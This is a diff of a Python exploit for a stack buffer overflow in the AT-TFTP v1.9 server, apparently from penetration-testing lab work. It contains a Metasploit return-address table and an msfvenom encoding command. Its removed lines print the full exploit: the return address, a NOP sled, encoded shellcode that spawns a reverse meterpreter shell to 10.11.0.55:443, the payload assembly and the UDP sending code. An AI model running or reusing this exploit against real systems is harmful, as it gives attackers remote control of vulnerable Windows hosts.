@@ -1,8 +1,8 @@
-#!/usr/bin/python
-## attftp_long_filename.py by Muhammad Haidari https://github.com/Muhammd/attftp_long_filename
+## attftp_long_filename exploit prepared by Muhammad Haidari https://github.com/Muhammd/attftp_long_filename
+## based on the https://www.exploit-db.com/exploits/16350/
 ##
 ## Exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.
-## Extracted from Metasploit  
+## the Return addresses Extracted from Metasploit  
 ##
 ## Spawns a reverse meterpreter shell to 10.11.0.55:443
 ##
@@ -11,14 +11,6 @@
 ##		- pick the right return address for the appropriate target
 ##
 ## Usage: python attftp_long_filename.py <IP Address> <Port> <Your IP Address>
-
-import sys, socket
-
-
-rhost = sys.argv[1] 				# Target IP address as command line argument
-rport = int(sys.argv[2])		# Target Port as command line argument
-lhost = sys.argv[3]				  # Attackers IP address
-
 
 ## Return addresses according to metasploit:
 ##
@@ -33,14 +25,6 @@ lhost = sys.argv[3]				  # Attackers IP address
 ##          [ 'Windows XP SP3 English',   { 'Ret' => 0x7e429353 } ], # ret by c0re
 ##          [ 'Windows Server 2003',      { 'Ret' => 0x7c86fed3 } ], # ret donated by securityxxxpert
 ##          [ 'Windows Server 2003 SP2',  { 'Ret' => 0x7c86a01b } ], # ret donated by Polar Bear
-
-
-
-ret = "\xd3\xfe\x86\x7c"			# Return address (Little Endian)
-
-nops = "\x90" *(25-len(lhost))			## Create NOP sled to brin NOPs & LHOST to 25 bytes
-
-
 
 ## Max space for shell code = 210
 ## Bad characters according to metasploit: \x00
@@ -72,42 +56,3 @@ nops = "\x90" *(25-len(lhost))			## Create NOP sled to brin NOPs & LHOST to 25 b
 ##
 ## Encode shellcode: cat shellcode | msfvenom -p - -b \x00 -a x86 --platform Windows -e x86/shikata_ga_nai -f python
 ## x86/shikata_ga_nai succeeded with size 210 (iteration=0)
-##
-buf =  ""
-buf += "\xb8\xd2\x25\x68\x1a\xd9\xe8\xd9\x74\x24\xf4\x5f\x29"
-buf += "\xc9\xb1\x2e\x31\x47\x15\x03\x47\x15\x83\xef\xfc\xe2"
-buf += "\x27\xa4\x84\xb6\xca\xa7\x54\x3b\xbe\x4c\x13\x2b\xc7"
-buf += "\x6c\x63\x54\x57\xa2\x47\x20\xea\xf8\xfc\x4b\x29\x79"
-buf += "\x02\x5b\xda\x2e\x24\xa2\x36\x5b\x10\x3e\xc7\xb2\x68"
-buf += "\xfe\x5e\xe6\x4a\x34\x6d\xf6\x8e\x4d\xad\x8d\xf8\x0d"
-buf += "\x4b\x57\xcf\xe7\x70\xec\x44\x48\x52\xf2\xb3\x31\x11"
-buf += "\xe8\x1a\x35\x6a\x0d\x9c\xa0\x77\x01\x07\xbb\x1b\x7d"
-buf += "\x2b\xdd\x1c\x9d\x62\xc6\x86\xd5\xc6\xc8\xcd\xaa\xc4"
-buf += "\xa3\xa1\x36\x78\x38\x29\x4f\xdc\x59\xfa\x29\x88\x96"
-buf += "\xce\xdd\x3f\xaa\x1c\x41\x94\x2a\xd9\x0f\x74\x4c\xcf"
-buf += "\x65\x27\xe1\xbc\xd6\x8b\x56\x01\x8a\x82\xbe\xe3\xad"
-buf += "\x7a\x48\xe9\xfa\xd7\x2f\x54\xe3\x07\x50\x70\x8a\x0e"
-buf += "\x07\x13\xac\xa7\xcf\x83\x58\x43\xf0\x64\x3b\x3b\xf1"
-buf += "\x31\xa5\xe8\x78\xa6\x40\x1f\x28\x7f\xf3\xa6\x99\x7a"
-buf += "\x04\x0e\x75\x30\xf6\xff\x25\x6f\x54\x66\x73\x4f\x62"
-buf += "\x99\x65"
-
-
-
-tail	= ""				# tail from metasploit
-tail	+= "\x83\xc4\x28\xc3" 		# <-- esp = add esp 0x28 + retn
-tail	+= "\x00netascii\x00"		  # Finish as expected by the AT TFTP server
-
-## Let's build the exploit
-
-exploit = "\x00\x02" + nops + buf + ret + tail
-
-
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Declare a UDP socket
-
-try:
-	print "\nDelivering The Package... Please Wait"
-	s.sendto(exploit, (rhost, rport))
-	print "\nPackage delivered! Check you session"
-except:
-	print "\nCould not connect to " + rhost + ":" + str(rport) + "!"
